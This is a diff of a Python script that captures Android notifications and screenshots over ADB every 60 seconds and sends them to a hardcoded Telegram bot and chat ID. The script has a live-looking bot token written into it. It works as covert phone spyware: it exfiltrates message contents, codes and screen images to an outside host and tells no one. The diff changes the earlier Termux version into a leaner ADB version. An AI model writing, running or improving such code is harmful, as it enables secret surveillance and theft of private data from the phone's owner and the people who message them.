@@ -1,93 +1,52 @@
-import os
+import subprocess
 import requests
-import json
-from datetime import datetime
 import time
-import logging
-
-# Setup logging
-logging.basicConfig(filename="script.log", level=logging.DEBUG)
-
-def log_debug(message):
-    logging.debug(message)
-    print(message)
 
 # Telegram Bot Configuration
-BOT_TOKEN = "7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
+TOKEN = "7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
 CHAT_ID = "5928551879"
 
-# Function to send a message to Telegram
-def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": CHAT_ID, "text": message}
-    try:
-        response = requests.post(url, data=data)
-        log_debug(f"Telegram Response (Message): {response.json()}")
-    except Exception as e:
-        log_debug(f"Failed to send message: {e}")
+# Send Telegram Message
+def send_message(text):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    data = {"chat_id": CHAT_ID, "text": text}
+    response = requests.post(url, data=data)
+    return response.json()
 
-# Function to send a file to Telegram
-def send_telegram_file(file_path, caption=""):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-    try:
-        with open(file_path, "rb") as file:
-            files = {"document": file}
-            data = {"chat_id": CHAT_ID, "caption": caption}
-            response = requests.post(url, data=data, files=files)
-            log_debug(f"Telegram Response (File): {response.json()}")
-    except Exception as e:
-        log_debug(f"Failed to send file: {e}")
+# Send Telegram File
+def send_file(file_path, caption):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    with open(file_path, "rb") as file:
+        response = requests.post(url, data={"chat_id": CHAT_ID, "caption": caption}, files={"document": file})
+    return response.json()
 
-# Function to get notifications via Termux
-def get_notifications():
+# Fetch Notifications using ADB
+def fetch_notifications():
     try:
-        # Use Termux to get the list of notifications
-        output = os.popen("termux-notification-list").read()
-        notifications = json.loads(output)
-        
-        messages = []
-        for notification in notifications:
-            app = notification.get("packageName", "Unknown App")
-            title = notification.get("title", "No Title")
-            text = notification.get("text", "No Content")
-            messages.append(f"App: {app}\nTitle: {title}\nText: {text}")
-        
-        log_debug(f"Parsed Notifications: {messages}")
-        return "\n\n".join(messages)
+        result = subprocess.check_output(["adb", "shell", "dumpsys", "notification"]).decode("utf-8")
+        if result:
+            send_message(f"Notifications:\n{result[:4000]}")  # Limit to 4000 chars per message
+        else:
+            send_message("No notifications found.")
     except Exception as e:
-        log_debug(f"Failed to get notifications: {e}")
-        return "Failed to retrieve notifications."
+        send_message(f"Error fetching notifications: {e}")
 
-# Function to take a screenshot via Termux
-def take_screenshot():
+# Capture Screenshot using ADB
+def capture_screenshot():
     try:
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        screenshot_path = os.path.join(os.getcwd(), f"screenshot_{timestamp}.png")
-        
-        # Use Termux to take the screenshot
-        os.system(f"termux-screenshot {screenshot_path}")
-        log_debug(f"Screenshot saved at: {screenshot_path}")
-        
-        return screenshot_path
+        file_path = "screenshot.png"
+        with open(file_path, "wb") as f:
+            subprocess.run(["adb", "exec-out", "screencap", "-p"], stdout=f)
+        send_file(file_path, "Screenshot captured")
     except Exception as e:
-        log_debug(f"Failed to take screenshot: {e}")
-        return None
+        send_message(f"Error capturing screenshot: {e}")
 
-# Main function
+# Main Loop
 def main():
     while True:
-        # Get notifications
-        notifications = get_notifications()
-        if notifications:
-            send_telegram_message(f"Notifications:\n\n{notifications}")
-        
-        # Take a screenshot
-        screenshot_path = take_screenshot()
-        if screenshot_path and os.path.exists(screenshot_path):
-            send_telegram_file(screenshot_path, caption="Screenshot captured")
-        
-        # Wait for 5 minutes before the next iteration
-        time.sleep(300)  # 300 seconds = 5 minutes
+        fetch_notifications()
+        capture_screenshot()
+        time.sleep(60)  # Run every 60 seconds
 
 if __name__ == "__main__":
     main()
